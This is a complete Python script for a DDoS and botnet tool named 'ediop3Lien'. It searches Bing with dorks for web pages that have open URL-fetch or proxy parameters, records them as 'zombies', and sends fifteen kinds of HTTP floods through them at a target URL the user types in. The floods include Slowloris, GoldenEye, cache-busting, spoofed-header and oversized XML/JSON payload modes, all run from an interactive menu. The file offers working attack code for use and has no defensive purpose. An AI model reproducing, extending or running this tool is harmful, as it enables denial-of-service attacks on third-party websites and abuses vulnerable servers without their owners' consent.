#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import random
import threading
import time
import requests
from bs4 import BeautifulSoup
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP

ZOMBIE_FILE = "zombies.txt"
DORK_FILE = "dorks.txt"
MAX_ZOMBIES = 8000
THREADS = 50

class AlienTech:
    def __init__(self):
        self.power = random.randint(9000, 999999)
        self.name = random.choice(["Xorg", "Zylak", "Vortex", "Nebulon"])

    def __str__(self):
        return f"👽 {self.name} | Power: {self.power} ⚡"

class BotnetMaster:
    def __init__(self):
        self.zombies = self.load_zombies()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
            "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"
        ]
        self.vuln_params = [
            "url=", "target=", "link=", "src=",
            "page=", "file=", "load=", "redirect="
        ]
        self.cache_busters = [
            "?id=", "?cache=", "?time=", "?rand=",
            "?nocache=", "?buster=", "?z="
        ]
        self.json_payloads = [
            '{"attack":"true","data":"' + 'A'*1000 + '"}',
            '{"request":"POST","params":{"x":"' + 'Z'*500 + '"}}',
            '{"query":"' + 'X'*2000 + '","type":"ediop3Lien"}'
        ]
        self.xml_payloads = [
            '<?xml version="1.0"?><attack><data>' + 'X'*1000 + '</data></attack>',
            '<request type="POST"><param name="ediop3Lien">' + 'A'*500 + '</param></request>'
        ]

    def load_zombies(self):
        if os.path.exists(ZOMBIE_FILE):
            with open(ZOMBIE_FILE, "r") as f:
                return [z.strip() for z in f.readlines() if z.strip()]
        return []

    def save_zombies(self):
        with open(ZOMBIE_FILE, "w") as f:
            for zombie in self.zombies[:MAX_ZOMBIES]:
                f.write(f"{zombie}\n")

    def scan_zombies(self, max_results=50):
        try:
            with open(DORK_FILE, "r") as f:
                dorks = f.read().splitlines()
        except:
            dorks = [
                "inurl:proxy.php?url=",
                "inurl:fetch.php?src=",
                "inurl:load.php?link=",
                "inurl:get.php?site=",
                "inurl:include.php?url="
            ]

        print(f"[🔥] Scanning for zombies with {len(dorks)} dorks...")
        for dork in dorks:
            try:
                url = f"https://www.bing.com/search?q={dork}"
                headers = {"User-Agent": random.choice(self.user_agents)}
                r = requests.get(url, headers=headers, timeout=10)
                soup = BeautifulSoup(r.text, 'html.parser')
                links = [a['href'] for a in soup.find_all('a', href=True) if "http" in a['href']]
                
                for link in links[:max_results]:
                    if self.test_zombie(link) and link not in self.zombies:
                        self.zombies.append(link)
                        print(f"[+] Zombie online: {link}")
            except Exception as e:
                print(f"[-] Dork failed: {e}")
        
        self.save_zombies()
        print(f"[💀] Total zombies: {len(self.zombies)}")

    def test_zombie(self, url):
        try:
            test_url = f"{url}?{random.choice(self.vuln_params)}http://example.com"
            r = requests.get(test_url, 
                           headers={"User-Agent": random.choice(self.user_agents)}, 
                           timeout=10)
            return "Example Domain" in r.text
        except:
            return False

    def attack_via_zombies(self, target, attack_type, duration=60):
        if not self.zombies:
            print("[-] No zombies! Scan first.")
            return

        print(f"[💥] Launching {attack_type} attack via {len(self.zombies)} zombies on {target}!")
        stop_event = threading.Event()
        
        def zombie_attack(zombie):
            try:
                param = random.choice(self.vuln_params)
                cache_buster = random.choice(self.cache_busters) + str(random.randint(0,100000))
                
                if attack_type == "http_get":
                    attack_url = f"{zombie}?{param}{target}{cache_buster}"
                    requests.get(attack_url, 
                               headers={"User-Agent": random.choice(self.user_agents)}, 
                               timeout=5)
                
                elif attack_type == "http_post":
                    attack_url = f"{zombie}?{param}{target}"
                    requests.post(attack_url, 
                                data={"attack": "true"}, 
                                headers={"User-Agent": random.choice(self.user_agents)}, 
                                timeout=5)
                
                elif attack_type == "slowloris":
                    attack_url = f"{zombie}?{param}{target}"
                    s = requests.Session()
                    s.get(attack_url, 
                         headers={"User-Agent": random.choice(self.user_agents)}, 
                         timeout=5, 
                         stream=True)
                    while not stop_event.is_set():
                        s.post(attack_url, 
                               headers={"X-a": str(random.randint(1,5000))}, 
                               timeout=5)
                        time.sleep(10)
                
                elif attack_type == "goldeneye":
                    attack_url = f"{zombie}?{param}{target}{cache_buster}"
                    headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "Cache-Control": "no-cache",
                        "Accept-Encoding": "gzip, deflate",
                        "Connection": "keep-alive",
                        "Keep-Alive": random.randint(1,1000)
                    }
                    requests.get(attack_url, headers=headers, timeout=5)
                
                elif attack_type == "http_random":
                    methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS"]
                    attack_url = f"{zombie}?{param}{target}{cache_buster}"
                    if random.choice(methods) == "GET":
                        requests.get(attack_url, 
                                   headers={"User-Agent": random.choice(self.user_agents)}, 
                                   timeout=5)
                    else:
                        requests.post(attack_url, 
                                    data={"random": "attack"}, 
                                    headers={"User-Agent": random.choice(self.user_agents)}, 
                                    timeout=5)
                
                elif attack_type == "http_spider":
                    attack_url = f"{zombie}?{param}{target}{cache_buster}"
                    spider_headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "Referer": f"http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    }
                    requests.get(attack_url, headers=spider_headers, timeout=5)
                
                elif attack_type == "http_cache":
                    attack_url = f"{zombie}?{param}{target}{cache_buster}"
                    cache_headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "Cache-Control": "no-store, no-cache, must-revalidate",
                        "Pragma": "no-cache",
                        "Expires": "0"
                    }
                    requests.get(attack_url, headers=cache_headers, timeout=5)
                
                elif attack_type == "http_slow":
                    attack_url = f"{zombie}?{param}{target}"
                    s = requests.Session()
                    s.get(attack_url, 
                         headers={"User-Agent": random.choice(self.user_agents)}, 
                         timeout=5, 
                         stream=True)
                    while not stop_event.is_set():
                        s.post(attack_url, 
                              data={"slow": "X"*10000}, 
                              headers={"X-a": str(random.randint(1,5000))}, 
                              timeout=5)
                        time.sleep(15)
                
                elif attack_type == "http_bandwidth":
                    attack_url = f"{zombie}?{param}{target}{cache_buster}"
                    requests.get(attack_url, 
                               headers={"User-Agent": random.choice(self.user_agents)}, 
                               timeout=5)
                    requests.get(attack_url.replace("http://", "http://www."), 
                               headers={"User-Agent": random.choice(self.user_agents)}, 
                               timeout=5)
                
                elif attack_type == "http_ajax":
                    attack_url = f"{zombie}?{param}{target}{cache_buster}"
                    ajax_headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "X-Requested-With": "XMLHttpRequest",
                        "Accept": "application/json, text/javascript, */*; q=0.01"
                    }
                    requests.get(attack_url, headers=ajax_headers, timeout=5)
                
                elif attack_type == "http_xml":
                    attack_url = f"{zombie}?{param}{target}"
                    xml_headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "Content-Type": "application/xml"
                    }
                    requests.post(attack_url, 
                                data=random.choice(self.xml_payloads), 
                                headers=xml_headers, 
                                timeout=5)
                
                elif attack_type == "http_json":
                    attack_url = f"{zombie}?{param}{target}"
                    json_headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "Content-Type": "application/json"
                    }
                    requests.post(attack_url, 
                                data=random.choice(self.json_payloads), 
                                headers=json_headers, 
                                timeout=5)
                
                elif attack_type == "http_headers":
                    attack_url = f"{zombie}?{param}{target}{cache_buster}"
                    headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "X-Custom-Header": "ediop3LienAttack",
                        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        "X-Request-ID": str(random.randint(100000,999999)),
                        "X-ediop3Lien-Power": str(random.randint(9000,9999))
                    }
                    requests.get(attack_url, headers=headers, timeout=5)
                
                elif attack_type == "http_cookie":
                    attack_url = f"{zombie}?{param}{target}{cache_buster}"
                    cookies = {
                        "session_id": str(random.randint(100000,999999)),
                        "ediop3Lien_token": "".join(random.choices("abcdef0123456789", k=32)),
                        "attack_cookie": "1"
                    }
                    requests.get(attack_url, 
                               cookies=cookies, 
                               headers={"User-Agent": random.choice(self.user_agents)}, 
                               timeout=5)
                
                elif attack_type == "http_referer":
                    attack_url = f"{zombie}?{param}{target}{cache_buster}"
                    referers = [
                        f"http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        "https://www.google.com",
                        "https://www.facebook.com",
                        "https://www.youtube.com",
                        "https://www.twitter.com"
                    ]
                    headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "Referer": random.choice(referers)
                    }
                    requests.get(attack_url, headers=headers, timeout=5)
                
            except:
                pass

        threads = []
        for _ in range(THREADS):
            for zombie in self.zombies:
                t = threading.Thread(target=zombie_attack, args=(zombie,))
                t.daemon = True
                threads.append(t)
                t.start()

        time.sleep(duration)
        stop_event.set()
        
        for t in threads:
            t.join()

class DDoSEngine:
    def __init__(self, botnet):
        self.botnet = botnet
        self.alien = AlienTech()

    def http_get_flood(self, target, duration=60):
        print(f"[🔥] {self.alien} launching HTTP GET Flood")
        self.botnet.attack_via_zombies(target, "http_get", duration)

    def http_post_flood(self, target, duration=60):
        print(f"[📯] {self.alien} launching HTTP POST Flood")
        self.botnet.attack_via_zombies(target, "http_post", duration)

    def slowloris(self, target, duration=60):
        print(f"[🐢] {self.alien} launching Slowloris")
        self.botnet.attack_via_zombies(target, "slowloris", duration)

    def goldeneye(self, target, duration=60):
        print(f"[💎] {self.alien} launching GoldenEye")
        self.botnet.attack_via_zombies(target, "goldeneye", duration)

    def http_random(self, target, duration=60):
        print(f"[🎲] {self.alien} launching Random HTTP Flood")
        self.botnet.attack_via_zombies(target, "http_random", duration)

    def http_spider(self, target, duration=60):
        print(f"[🕷️] {self.alien} launching Spider Flood")
        self.botnet.attack_via_zombies(target, "http_spider", duration)

    def http_cache(self, target, duration=60):
        print(f"[🗄️] {self.alien} launching Cache Control Flood")
        self.botnet.attack_via_zombies(target, "http_cache", duration)

    def http_slow(self, target, duration=60):
        print(f"[🐌] {self.alien} launching Slow HTTP")
        self.botnet.attack_via_zombies(target, "http_slow", duration)

    def http_bandwidth(self, target, duration=60):
        print(f"[📶] {self.alien} launching Bandwidth Drain")
        self.botnet.attack_via_zombies(target, "http_bandwidth", duration)

    def http_ajax(self, target, duration=60):
        print(f"[🔄] {self.alien} launching AJAX Flood")
        self.botnet.attack_via_zombies(target, "http_ajax", duration)

    def http_xml(self, target, duration=60):
        print(f"[📄] {self.alien} launching XML Flood")
        self.botnet.attack_via_zombies(target, "http_xml", duration)

    def http_json(self, target, duration=60):
        print(f"[📦] {self.alien} launching JSON Flood")
        self.botnet.attack_via_zombies(target, "http_json", duration)

    def http_headers(self, target, duration=60):
        print(f"[📋] {self.alien} launching Header Flood")
        self.botnet.attack_via_zombies(target, "http_headers", duration)

    def http_cookie(self, target, duration=60):
        print(f"[🍪] {self.alien} launching Cookie Flood")
        self.botnet.attack_via_zombies(target, "http_cookie", duration)

    def http_referer(self, target, duration=60):
        print(f"[🔗] {self.alien} launching Referer Flood")
        self.botnet.attack_via_zombies(target, "http_referer", duration)

def main():
    print("""
    █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
    █░░   ediop3Lien   ░░█
    █░░made by ediop3  ░░█
    █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
    [1] DDoS Attacks 
    [2] Botnet Controller
    [3] Alien Tech 
    [4] Exit
    """)

    botnet = BotnetMaster()
    ddos = DDoSEngine(botnet)

    while True:
        try:
            choice = input("[ediop3Lien]> ")

            if choice == "1":
                target = input("[🎯] Target URL: ")
                if not target.startswith(('http://', 'https://')):
                    target = 'http://' + target
                
                print("""
                [⚡] Attack Methods:
                1. HTTP GET Flood
                2. HTTP POST Flood
                3. Slowloris
                4. GoldenEye
                5. Random HTTP Flood
                6. Spider Flood
                7. Cache Control Flood
                8. Slow HTTP
                9. Bandwidth Drain
                10. AJAX Flood
                11. XML Flood
                12. JSON Flood
                13. Header Flood
                14. Cookie Flood
                15. Referer Flood
                """)
                method = input("[💀]> ")
                
                attacks = {
                    "1": ddos.http_get_flood,
                    "2": ddos.http_post_flood,
                    "3": ddos.slowloris,
                    "4": ddos.goldeneye,
                    "5": ddos.http_random,
                    "6": ddos.http_spider,
                    "7": ddos.http_cache,
                    "8": ddos.http_slow,
                    "9": ddos.http_bandwidth,
                    "10": ddos.http_ajax,
                    "11": ddos.http_xml,
                    "12": ddos.http_json,
                    "13": ddos.http_headers,
                    "14": ddos.http_cookie,
                    "15": ddos.http_referer
                }
                
                if method in attacks:
                    try:
                        duration = int(input("[⏱️] Attack duration (seconds): "))
                        attacks[method](target, duration)
                    except ValueError:
                        print("[-] Invalid duration! Using default 60 seconds")
                        attacks[method](target)
                else:
                    print("[-] Invalid method!")

            elif choice == "2":
                print("""
                [🕷️] Botnet Options:
                1. Scan for Zombies
                2. View Zombies
                3. Clear Zombies
                """)
                option = input("[ediop3Lien]> ")
                
                if option == "1":
                    botnet.scan_zombies()
                elif option == "2":
                    print(f"[💀] Active zombies: {len(botnet.zombies)}")
                    for z in botnet.zombies[:10]:
                        print(f"  - {z}")
                elif option == "3":
                    botnet.zombies = []
                    botnet.save_zombies()
                    print("[🗑️] Zombies cleared!")
                else:
                    print("[-] Invalid option!")

            elif choice == "3":
                print(f"[👽] {AlienTech()}")
            
            elif choice == "4":
                print("[👾] Exiting ediop3Lien's Wrath...")
                sys.exit(0)
            
            else:
                print("[-] Invalid choice!")
        except KeyboardInterrupt:
            print("\n[!] Ctrl+C detected. Exiting...")
            sys.exit(0)
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
